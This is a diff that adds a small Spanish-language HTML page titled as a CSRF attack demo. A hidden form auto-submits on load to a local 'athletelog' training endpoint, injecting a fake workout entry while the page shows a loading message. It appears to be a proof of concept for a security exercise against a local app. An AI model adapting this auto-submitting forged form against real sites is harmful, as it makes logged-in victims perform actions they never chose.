@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Demo Ataque CSRF</title>
+</head>
+<body>
+    <h3>Cargando contenido...</h3>
+    <form id="csrfForm" action="http://localhost/athletelog/training.php" method="POST">
+        <input type="hidden" name="date" value="2026-11-22">
+        <input type="hidden" name="type" value="Fuerza">
+        <input type="hidden" name="duration" value="60">
+        <input type="hidden" name="rpe" value="8">
+        <input type="hidden" name="notes" value="Entrenamiento inyectado via CSRF">
+        <input type="hidden" name="injury_text" value="">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
